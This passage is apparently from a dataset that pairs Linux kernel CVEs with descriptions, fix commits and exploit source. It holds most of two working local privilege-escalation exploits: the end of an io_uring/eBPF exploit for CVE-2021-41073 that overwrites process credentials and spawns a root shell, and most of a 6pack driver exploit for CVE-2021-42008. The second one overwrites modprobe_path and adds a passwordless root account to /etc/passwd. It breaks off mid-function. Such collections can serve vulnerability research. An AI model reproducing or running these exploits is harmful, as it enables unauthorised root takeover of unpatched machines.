    int fuse_fd1 = -1;
    int fuse_fd2 = -1;
    int fuse_fd3 = -1;
    int fuse_fd4 = -1;

    if(0 != system(cmd))
    {
        goto done;
    }

    fuse_fd1 = open(""/tmp/fuse_mount/task"", O_RDWR);

    if(fuse_fd1 < 0)
    {
        goto done;
    }

    copy_map1 = mmap((void*)0x1000, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

    if(MAP_FAILED == copy_map1)
    {
        goto done;
    }

    sleep_map1 = mmap(copy_map1 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd1, 0);

    if((copy_map1 + PAGESIZE) != sleep_map1)
    {
        goto done;
    }

    fuse_fd2 = open(""/tmp/fuse_mount/seqop"", O_RDWR);

    if(fuse_fd2 < 0)
    {
        goto done;
    }

    copy_map2 = mmap(sleep_map1 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

    if(MAP_FAILED == copy_map2)
    {
        goto done;
    }

    sleep_map2 = mmap(copy_map2 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd2, 0);

    if((copy_map2 + PAGESIZE) != sleep_map2)
    {
        goto done;
    }

    fuse_fd3 = open(""/tmp/fuse_mount/iobuf"", O_RDWR);

    if(fuse_fd3 < 0)
    {
        goto done;
    }

    copy_map3 = mmap(sleep_map2 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

    if(MAP_FAILED == copy_map3)
    {
        goto done;
    }

    sleep_map3 = mmap(copy_map3 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd3, 0);

    if((copy_map3 + PAGESIZE) != sleep_map3)
    {
        goto done;
    }

    fuse_fd4 = open(""/tmp/fuse_mount/bpfprog"", O_RDWR);

    if(fuse_fd4 < 0)
    {
        goto done;
    }

    block_map1 = mmap(NULL, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd4, 0);

    if(MAP_FAILED == block_map1)
    {
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int setup_bpf(void)
{
    int ret = -1;

    struct bpf_insn insn[] = 
    {
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    if(0 != load_bpf_prog(insn, sizeof(insn) / sizeof(insn[0])))
    {
        printf(""[-] failed to load eBPF program!\n"");
        goto done;
    }

    ret = 0;

done:
    return ret;
}

void do_setxattr(void* xattr_buf, void* leakbuf, pthread_mutex_t* lock)
{
    pthread_mutex_unlock(lock);

    setxattr(""lol.txt"", ""user.lol"", xattr_buf, 32, 0);
    getxattr(""lol.txt"", ""user.lol"", leakbuf, 32);
}

long prep_setxattr(long cmd)
{  
    long ret = 0;
    char* xattr_buf = NULL;
    long* retptr = NULL;
    long* leakptr = NULL;
    pthread_mutex_t* lock = NULL;
    long leak[4] = {0};

    struct bpf_insn exploit[] = 
    {
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_MOV32_IMM(BPF_REG_1, *upper_tsk),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
        BPF_MOV32_IMM(BPF_REG_2, *lower_tsk),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, TASK_STRUCT_CRED_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, CRED_UID_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, CRED_EUID_OFFSET),
        BPF_EXIT_INSN()
    };

    switch(cmd)
    {
        case 0:
            xattr_buf = copy_map1 + PAGESIZE - 31;
            retptr = &leak[2];
            leakptr = leak;
            lock = &lock1;
            break;
        case 1:
            xattr_buf = copy_map2 + PAGESIZE - 31;
            retptr = &leak[2];
            leakptr = leak;
            lock = &lock2;
            break;
        case 2:
            xattr_buf = copy_map3 + PAGESIZE - 31;
            retptr = &leak[1];
            leakptr = leak;
            lock = &lock3;
            break;
        case 3:
            xattr_buf = copy_map1;
            memcpy(xattr_buf, &bpf_prog_run32_addr, sizeof(long));
            memcpy(xattr_buf + 0x18, &exploit, sizeof(exploit));
            leakptr = block_map1;
            lock = &lock3;
            break;
        case 4:
            xattr_buf = copy_map2;
            memcpy(xattr_buf, &exploit[1], sizeof(exploit) - sizeof(exploit[0]));
            leakptr = block_map1;
            lock = &lock3;
            break;
        case 5:
            xattr_buf = copy_map3;
            leakptr = block_map1;
            memcpy(xattr_buf, &exploit[5], sizeof(exploit) - sizeof(exploit[0])*5);
            lock = &lock3;
            break;
        case 6:
            xattr_buf = copy_map3;
            leakptr = block_map1;
            memcpy(xattr_buf + 0x18, &fake_bpf_prog_addr, sizeof(long));
            lock = &lock4;
            break;
    }

    do_setxattr(xattr_buf, leakptr, lock);

    return *retptr;
}

void* do_io_uring(void* blah)
{
    struct io_uring_sqe* sqe = NULL;
    struct io_uring_cqe* cqe = NULL;
    struct timespec tim = {0};
    cpu_set_t mask = {0};
    tim.tv_nsec = 3001337;

    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);

    pthread_mutex_lock(&lock1);
    nanosleep(&tim, NULL);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs2, 0x100, 2, group_id2, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    if(0 != io_uring_register_iowq_aff(&ring, sizeof(cpu_set_t), &mask))
    {
        fprintf(stderr, ""++ register failed: %m\n"");
    }
    
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, bufs1[3], 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    pthread_mutex_unlock(&lock1);
    pthread_mutex_lock(&lock2);
    nanosleep(&tim, NULL);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, bufs1[0], 0x40, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    open(""/proc/cmdline"", O_RDONLY);

    pthread_mutex_lock(&lock3);
    nanosleep(&tim, NULL);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, bufs1[0], 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 2, group_id1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    pthread_mutex_lock(&lock5);

}

void* do_io_uring2(void* blah)
{
    struct io_uring_sqe* sqe = NULL;
    struct io_uring_cqe* cqe = NULL;
    struct timespec tim = {0};
    cpu_set_t mask = {0};
    tim.tv_nsec = 3001337;

    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);
    
    nanosleep(&tim, NULL);
    pthread_mutex_lock(&lock1);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs2, 0x100, 2, group_id2, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    pthread_mutex_lock(&lock4);

    run_bpf_prog();

    if(0 == getuid())
    {
        sleep(1);
        printf(""[+] it worked! have a r00t shell :)\n"");
        system(""sh"");
    }
    
}

void* setxattr_thread_routine(void* cmd)
{
    struct timespec tim = {0};
    cpu_set_t mask = {0};

    tim.tv_nsec = 1001337;

    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);

    pthread_mutex_lock(&lock3);
    nanosleep(&tim, NULL);

    prep_setxattr((long)cmd);
}

void create_setxattr_threads(void)
{
    struct timespec tim = {0};
    pthread_t thread1 = {0};
    pthread_t thread2 = {0};
    pthread_t thread3 = {0};

    tim.tv_nsec = 2001337;
    
    pthread_create(&thread1, NULL, setxattr_thread_routine, (void*)3);
    nanosleep(&tim, NULL);
    pthread_create(&thread2, NULL, setxattr_thread_routine, (void*)4);
    nanosleep(&tim, NULL);
    pthread_create(&thread3, NULL, setxattr_thread_routine, (void*)5);
}

void create_io_uring_threads(void)
{
    pthread_t thread1 = {0};
    pthread_t thread2 = {0};
    
    pthread_create(&thread1, NULL, do_io_uring, NULL);
    pthread_create(&thread2, NULL, do_io_uring2, NULL);
}

int setup(void)
{
    int ret = -1;
    int lol_fd = -1;
    cpu_set_t mask = {0};
    struct io_uring_params params = {0};
    struct io_uring_sqe* sqe = NULL;
    struct io_uring_cqe* cqe = NULL;

    pthread_mutex_lock(&lock1);
    pthread_mutex_lock(&lock2);
    pthread_mutex_lock(&lock3);
    pthread_mutex_lock(&lock4);
    pthread_mutex_lock(&lock5);

    lol_fd = open(""lol.txt"", O_RDWR | O_CREAT, 0666);

    if(lol_fd < 0)
    {
        printf(""[-] failed to create setxattr file!\n"");
        goto done;
    }

    printf(""[+] set/getxattr file created\n"");

    if(0 != setup_bpf())
    {
        printf(""[-] failed to setup eBPF!\n"");
        goto done;
    }

    printf(""[+] bpf program loaded created\n"");

    if (0 != setup_fuse())
    {
        printf(""[-] failed to setup FUSE\n"");
        goto done;
    }

    printf(""[+] FUSE maps created\n"");
    
    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);
    
    create_io_uring_threads();
    create_setxattr_threads();

    procmaps_fd = open(""/proc/self/maps"", O_RDONLY);

    printf(""[+] opened /proc/self/maps\n"");

    if(0 > procmaps_fd)
    {
        printf(""[-] failed to open /proc/self/maps!\n"");
        goto done;
    }

    if(0 != io_uring_queue_init_params(2048, &ring, &params))
    {
        printf(""[-] failed to initialize io_uring!\n"");
        goto done;
    }

    printf(""[+] io_uring initialized\n"");

    if(0 != io_uring_register_iowq_aff(&ring, sizeof(cpu_set_t), &mask))
    {
        fprintf(stderr, ""++ register failed: %m\n"");
        goto done;
    }

    printf(""[+] spraying kmalloc-32 cache with io_buffer structs!!\n"");

    sqe = io_uring_get_sqe(&ring);

    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 1000, group_id1, 3);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    if (0 > cqe->res)
    {
        printf(""[-] submit buffers failed!\n"");
        goto done;
    }

    printf(""[!] vuln trigger #1 for task_struct leak\n"");
    
    task_struct_addr = prep_setxattr(0);
    printf(""[+] task_struct: %lx\n"", task_struct_addr);
    
    printf(""[!] vuln trigger #2 for KASLR leak \n"");
    bpf_prog_run32_addr = prep_setxattr(1) - BPF_PROG_RUN_OFFSET;

    printf(""[!] single_next: %lx\n"", bpf_prog_run32_addr + BPF_PROG_RUN_OFFSET);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 1000, group_id1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    printf(""[!] vuln trigger #3 for cache ptr leak\n"");
    fake_bpf_prog_addr = prep_setxattr(2) + 0x30;
    printf(""[+] fake bpf_prog: %lx\n"", fake_bpf_prog_addr);

    sqe = io_uring_get_sqe(&ring);

    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 5, group_id1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    attach_bpf_prog();

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, bufs1[0], 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    printf(""[!] vuln trigger #4 to overwrite socket filter\n"");
    prep_setxattr(6);

done:
    getchar();
    return ret;

}

int main(int argc, char **argv)
{

    if(0 != setup())
    {
        printf(""[-] setup failed!\n"");
    }
}

",https://github.com/chompie1337/Linux_LPE_io_uring_CVE-2021-41073/tree/main,,,
CVE-2021-42008,https://www.opencve.io/cve/CVE-2021-42008,The decode_data function in drivers/net/hamradio/6pack.c in the Linux kernel before 5.13.13 has a slab out-of-bounds write. Input from a process that has the CAP_NET_ADMIN capability can lead to root access.,"net: 6pack: fix slab-out-of-bounds in decode_data
Syzbot reported slab-out-of bounds write in decode_data().
The problem was in missing validation checks.

Syzbot's reproducer generated malicious input, which caused
decode_data() to be called a lot in sixpack_decode(). Since
rx_count_cooked is only 400 bytes and noone reported before,
that 400 bytes is not enough, let's just check if input is malicious
and complain about buffer overrun.

Fail log:
==================================================================
BUG: KASAN: slab-out-of-bounds in drivers/net/hamradio/6pack.c:843
Write of size 1 at addr ffff888087c5544e by task kworker/u4:0/7

CPU: 0 PID: 7 Comm: kworker/u4:0 Not tainted 5.6.0-rc3-syzkaller #0
...
Workqueue: events_unbound flush_to_ldisc
Call Trace:
 __dump_stack lib/dump_stack.c:77 [inline]
 dump_stack+0x197/0x210 lib/dump_stack.c:118
 print_address_description.constprop.0.cold+0xd4/0x30b mm/kasan/report.c:374
 __kasan_report.cold+0x1b/0x32 mm/kasan/report.c:506
 kasan_report+0x12/0x20 mm/kasan/common.c:641
 __asan_report_store1_noabort+0x17/0x20 mm/kasan/generic_report.c:137
 decode_data.part.0+0x23b/0x270 drivers/net/hamradio/6pack.c:843
 decode_data drivers/net/hamradio/6pack.c:965 [inline]
 sixpack_decode drivers/net/hamradio/6pack.c:968 [inline]

Reported-and-tested-by: syzbot+fc8cd9a673d4577fb2e4@syzkaller.appspotmail.com
Fixes: 1da177e4c3f4 (""Linux-2.6.12-rc2"")
Signed-off-by: Pavel Skripkin <paskripkin@gmail.com>
Reviewed-by: Dan Carpenter <dan.carpenter@oracle.com>
Signed-off-by: David S. Miller <davem@davemloft.net>
Diffstat
-rw-r--r--	drivers/net/hamradio/6pack.c	6	
1 files changed, 6 insertions, 0 deletions
diff --git a/drivers/net/hamradio/6pack.c b/drivers/net/hamradio/6pack.c
index fcf3af76b6d7b7..8fe8887d506a3e 100644
--- a/drivers/net/hamradio/6pack.c
+++ b/drivers/net/hamradio/6pack.c
@@ -827,6 +827,12 @@ static void decode_data(struct sixpack *sp, unsigned char inbyte)
 		return;
 	}
 
+	if (sp->rx_count_cooked + 2 >= sizeof(sp->cooked_buf)) {
+		pr_err(""6pack: cooked buffer overrun, data loss\n"");
+		sp->rx_count = 0;
+		return;
+	}
+
 	buf = sp->raw_buf;
 	sp->cooked_buf[sp->rx_count_cooked++] =
 		buf[0] | ((buf[1] << 2) & 0xc0);",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19d1532a187669ce86d5a2696eb7275310070793,"/*

    [CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver
                        by D3v17

*/

// Exploit is designed and tested for Debian 11, kernel 5.10.0-8-amd64

#define _GNU_SOURCE

#include <endian.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sched.h>
#include <stdbool.h>

//#define DEBUG 1

#ifdef DEBUG
#define debug_printf(...) printf(__VA_ARGS__)
#else
#define debug_printf(...) do {} while (0)
#endif

#define N_6PACK 7
#define PAGE_SIZE 0x1000
#define LEAK_PAYLOAD_SIZE 576
#define WRITE_PAYLOAD_SIZE 592
#define N_THREADS 8
#define N_MSG 6
#define INIT_IPC_NS 0x5b00

static int ufd_qid;
static int qid_A[N_MSG]         = {0};
static int qid_B[N_MSG]         = {0};
static pthread_t pfh_tid[10]    = {0};
static pthread_t msg_tid[10]    = {0};
static int shmid[0x100]         = {0};
static void *shmaddr[0x100]     = {0};
static int ufd[10]              = {0};
static void *pages[] = {

    (void *)0x1110000, (void *)0x2220000,
    (void *)0x3330000, (void *)0x4440000,
    (void *)0x5550000, (void *)0x6660000,
    (void *)0x7770000, (void *)0x8880000

};

uint8_t buff[PAGE_SIZE]  = {0};
uint8_t buff2[PAGE_SIZE] = {0};

uint64_t init_ipc_ns   = 0;
uint64_t modprobe_path = 0;
uint64_t leaked_queue  = 0;
int valid_qid = -1;
bool release_pfh = false;


struct pfh_args
{
    int id;
    int ufd;
    void *page;
};


struct t_args
{
    int id;
    int qid;
    void *page;
};


void __pause(char *msg)
{
    printf(""[-] Paused - %s\n"", msg);
    getchar();
}


void hexdump(uint8_t *buff, size_t size)
{
    int i,j;

    for (i = 0; i < size/8; i++)
    {
        if ((i % 2) == 0)
        {
            if (i != 0)
                printf(""  \n"");

            printf(""  %04x  "", i*8);
        }

        printf(""0x%016lx"", ((uint64_t *)(buff))[i]);
        printf(""    "");
    }

    putchar('\n');
}


int open_ptmx(void)
{
    int ptmx;

    ptmx = getpt();

    if (ptmx < 0)
    {
        perror(""[X] open_ptmx()"");
        exit(1);
    }

    grantpt(ptmx);
    unlockpt(ptmx);

    return ptmx;
}


int open_pts(int fd)
{
    int pts;

    pts = open(ptsname(fd), 0, 0);

    if (pts < 0)
    {
        perror(""[X] open_pts()"");
        exit(1);
    }

    return pts;
}


void set_line_discipline(int fd, int ldisc)
{
    if (ioctl(fd, TIOCSETD, &ldisc) < 0)
    {
        perror(""[X] ioctl() TIOCSETD"");
        exit(1);
    }
}


int init_sixpack()
{
    int ptmx, pts;

    ptmx = open_ptmx();
    pts = open_pts(ptmx);

    set_line_discipline(pts, N_6PACK);

    return ptmx;
}


uint8_t *sixpack_encode(uint8_t *src)
{
    uint8_t *dest = (uint8_t *)calloc(1, 0x3000);
    uint32_t raw_count = 2;

    for (int count = 0; count <= PAGE_SIZE; count++)
    {
        if ((count % 3) == 0)
        {
            dest[raw_count++] = (src[count] & 0x3f);
            dest[raw_count] = ((src[count] >> 2) & 0x30);
        }
        else if ((count % 3) == 1)
        {
            dest[raw_count++] |= (src[count] & 0x0f);
            dest[raw_count] =	((src[count] >> 2) & 0x3c);
        }
        else
        {
            dest[raw_count++] |= (src[count] & 0x03);
            dest[raw_count++] = (src[count] >> 2);
        }
    }

    return dest;
}


int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}


int initialize_ufd(void *page)
{
    int fd;

    struct uffdio_register reg;

    if ((fd = userfaultfd(O_NONBLOCK)) == -1)
    {
        perror(""[X] Userfaultfd failed"");
        exit(1);
    }

    if ((ufd_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror(""[X] msgget"");
        exit(1);
    }

    struct uffdio_api api = { .api = UFFD_API };

    if (ioctl(fd, UFFDIO_API, &api))
    {
        perror(""[X] ioctl - UFFDIO_API failed"");
        exit(1);
    }

    if (api.api != UFFD_API)
    {
        puts(""[X] Unexepcted UFFD api version!"");
        exit(1);
    }

    debug_printf(""[*] Start monitoring range: %p - %p\n"", page + PAGE_SIZE, page + PAGE_SIZE*2);

    reg.mode = UFFDIO_REGISTER_MODE_MISSING;
    reg.range.start = (long)(page + PAGE_SIZE);
    reg.range.len = PAGE_SIZE;

    if (ioctl(fd, UFFDIO_REGISTER,  &reg))
    {
        perror(""[X] ioctl - UFFDIO_REGISTER failed"");
        exit(1);
    }

    return fd;
}


void *page_fault_handler(void *arg)
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;
    struct uffdio_copy ufd_copy;
    struct uffdio_range ufd_range;

    pid_t pid;
    int ufd = ((struct pfh_args *)arg)->ufd;
    int id = ((struct pfh_args *)arg)->id + 1;
    void *page = ((struct pfh_args *)arg)->page;

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    debug_printf(""[PFH %d] Started!\n"", id);

    while (poll(&pollfd, 1, -1) > 0)
    {
        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            perror(""[X] Polling failed"");
            exit(1);
        }

        if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
        {
            perror(""[X] Read - fault_msg failed"");
            exit(1);
        }

        char *page_fault_location = (char *)fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror(""[X] Unexpected pagefault?"");
            exit(1);
        }

        if (page_fault_location == page + PAGE_SIZE)
        {
            debug_printf(""[PFH %d] Page fault at 0x%lx\n"", id, page_fault_location);

            for (;;)
            {
                if (!release_pfh)
                    continue;

                debug_printf(""[PFH %d] Releasing faulting thread\n"", id);

                ufd_copy.dst = (uint64_t)(page_fault_location);
                ufd_copy.src = (uint64_t)(&buff2);
                ufd_copy.len = PAGE_SIZE;
                ufd_copy.mode = 0;
                ufd_copy.copy = 0;

                if (ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
                {
                    perror(""[X] ioctl(UFFDIO_COPY)"");
                    exit(1);
                }

                break;
            }

            debug_printf(""[PFH %d] Faulting thread released\n"", id);
            break;

        }
    }
}


void alloc_msg_queue_A(int id)
{
    if ((qid_A[id] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror(""[X] msgget"");
        exit(1);
    }
}


void alloc_msg_queue_B(int id)
{
    if ((qid_B[id] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror(""[X] msgget"");
        exit(1);
    }
}


void *allocate_msg(void *arg)
{
    int id = ((struct t_args *)arg)->id;
    void *page = ((struct t_args *)arg)->page;

    debug_printf(""[Thread %d] Message buffer allocated at 0x%lx\n"", id + 1, page + PAGE_SIZE - 0x10);
    alloc_msg_queue_B(id);

    memset(page, 0, PAGE_SIZE);
    ((uint64_t *)(page))[0xff0 / 8] = 1; // msg_msg.m_type = 1

    if (msgsnd(qid_B[id], page + PAGE_SIZE - 0x10, 0x1018, 0) < 0)
    {
        perror(""[X] msgsnd"");
        exit(1);
    }

    debug_printf(""[Thread %d] Message sent!\n"", id + 1);
}


void send_msg(int qid, int size, int type, int c)
{
    struct msgbuf
    {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = type;
    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1)
    {
        perror(""[X] msgsnd"");
        exit(1);
    }
}


void *recv_msg(int qid, size_t size, int type)
{
    void *memdump = malloc(size);

    if (msgrcv(qid, memdump, size, type, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) < 0)
    {
        perror(""[X] msgrcv"");
        return NULL;
    }

    return memdump;
}


void alloc_shm(int i)
{
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i]  < 0)
    {
        perror(""[X] shmget fail"");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0)
    {
        perror(""[X] shmat"");
        exit(1);
    }
}


void destroy_shm(int i)
{
    shmdt(shmaddr[i]);
    shmctl(shmid[i], IPC_RMID, NULL);
}


void close_queue(int qid)
{
    if (msgctl(qid, IPC_RMID, NULL) < 0)
    {
        perror(""[X] msgctl()"");
        exit(1);
    }
}


int find_message_queue(uint16_t tag)
{
    switch (tag)
    {
        case 0x4141: return 0;
        case 0x4242: return 1;
        case 0x4343: return 2;
        case 0x4444: return 3;
        case 0x4545: return 4;
        case 0x4646: return 5;

        default: return -1;
    }
}


void leak_pointer(void)
{
    uint64_t *leak;

    for (int id = 0; id < N_MSG; id ++)
    {
        leak = (uint64_t *)recv_msg(qid_A[id], 0x1100, 0);

        if (leak == NULL)
            continue;

        for (int i = 0; i < 0x220; i++)
        {
            if ((leak[i] & 0xffff) == INIT_IPC_NS)
            {
                init_ipc_ns = leak[i];
                valid_qid = find_message_queue((uint16_t)leak[1]);
                modprobe_path = init_ipc_ns - 0x131040;
                return;
            }
        }
    }
}


uint8_t *generate_payload(uint64_t target)
{
    uint8_t *encoded;

    memset(buff, 0, PAGE_SIZE);

    // sp->rx_count_cooked = 0x696
    buff[0x194] = 0x90;
    buff[0x19a] = 0x06;

    // fix upper two bytes of msg_msg.m_list.prev
    buff[0x19b] = 0xff;
    buff[0x19c] = 0xff;

    // msg_msg.m_ts = 0x1100
    buff[0x1a6] = 0x11;

    // msg_msg.next = target
    if (target)
    {
        for (int i = 0; i < sizeof(uint64_t); i++)
            buff[0x1ad + i] = (target >> (8 * i)) & 0xff;
    }

    encoded = sixpack_encode(buff);

    // sp->status = 0x18 (to reach decode_data())
    encoded[0] = 0x88;
    encoded[1] = 0x98;

    return encoded;
}


void prepare_exploit()
{
    system(""echo -e '\xdd\xdd\xdd\xdd\xdd\xdd' > /tmp/asd"");
    system(""chmod +x /tmp/asd"");
    system(""echo '#!/bin/sh' > /tmp/x"");
    system(""echo 'chmod +s /bin/su' >> /tmp/x""); // Needed for busybox, just in case
    system(""echo 'echo \""pwn::0:0:pwn:/root:/bin/sh\"" >> /etc/passwd' >> /tmp/x"");
    system(""chmod +x /tmp/x"");

    memcpy(buff2 + 0xfc8, ""/tmp/x\00"", 7);
}


void create_pfh_thread(int id, int ufd, void *page)
{
    struct pfh_args *args = (struct pfh_args *)malloc(sizeof(struct pfh_args));

    args->id = id;
    args->ufd = ufd;
    args->page = page;

    pthread_create(&pfh_tid[id], NULL, page_fault_handler, (void *)args);
}


void create_message_thread(int id, void *page)
{
    struct t_args *args = (struct t_args *)malloc(sizeof(struct t_args));

    args->id = id;
    args->page = page;

    pthread_create(&msg_tid[id], NULL, allocate_msg, (void *)args);
}


void print_affinity()
{
    cpu_set_t mask;
    long ncpu, i;

    if (sched_getaffinity(getpid(), sizeof(cpu_set_t), &mask) < 0)
    {
        perror(""[X] sched_getaffinity()"");
        exit(1);
    }

    ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    puts(""[*] CPU affinity:"");

    for (i = 0; i < ncpu; i++)
        printf("" └ Core #%d = %d\n"", i, CPU_ISSET(i, &mask));
}


void assign_to_core(int core_id)
{
    cpu_set_t mask;
    pid_t pid;

    pid = getpid();

    printf(""[*] Assigning process %d to core %d\n"", pid, core_id);

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror(""[X] sched_setaffinity()"");
        exit(1);
    }

    print_affinity();
}


void waitfor(int n, char *msg)
{
    char *symbols[] = { ""\\"", ""|"" , ""/"", ""-"", NULL };

    for (int i = 0; i < n; i++)
    {
        printf(""\r[%s] %s"", symbols[i % 4], msg);
        fflush(stdout);
        sleep(1);
    }

    puts(""\r[+] Timer should be expired           "");
    fflush(stdout);
}


int main(void)
{
    int ptmx;
    uint8_t *payload;

    assign_to_core(0);
    prepare_exploit();

    for (int i = 0; i < N_THREADS; i++)
    {
        mmap(pages[i], PAGE_SIZE*3, PROT_READ|PROT_WRITE,
            MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
        ufd[i] = initialize_ufd(pages[i]);
    }

    for (int i = 0; i < N_THREADS; i++)
        create_pfh_thread(i, ufd[i], pages[i]);

    puts(""[*] Spraying shm_file_data in kmalloc-32..."");
    for (int i = 0; i < 100; i++)
        alloc_shm(shmid[i]);

    puts(""[*] Spraying messages in kmalloc-4k..."");
    for (int i = 0; i < N_MSG; i++)
        alloc_msg_queue_A(i);

    for (int i = 0; i < N_MSG; i++)
        send_msg(qid_A[i], 0x1018, 1, 'A' + i);

    recv_msg(qid_A[0], 0x1018, 0);

    ptmx = init_sixpack();
    payload = generate_payload(0);
    write(ptmx, payload, LEAK_PAYLOAD_SIZE);

    puts(""[*] Leaking pointers..."");
    leak_pointer();

    if (!modprobe_path)
    {
        puts(""[X] Leak failed, try again!"");
        goto end;
    }

    close_queue(qid_A[valid_qid]);

    printf(""[+] init_ipc_ns: 0x%lx\n"", init_ipc_ns);
    printf(""[+] modprobe_path: 0x%lx\n"", modprobe_path);

    payload = generate_payload(modprobe_path - 0x8);

    for (int i = 0; i < N_THREADS; i++)
        create_message_thread(i, pages[i]);

    waitfor(6, ""Waiting for resync_tnc callback..."");

    puts(""[*] Overwriting modprobe_path..."");
    write(ptmx, payload, WRITE_PAYLOAD_SIZE);

    sleep(1);

    release_pfh = true;

    for (int i = 0; i < N_THREADS; i++)
    {
        pthread_join(msg_tid[i], NULL);
        pthread_join(pfh_tid[i], NULL);
    }

    for (int i = 0; i < N_THREADS; i++)
        munmap(pages[i], PAGE_SIZE*3);

    release_pfh = false;

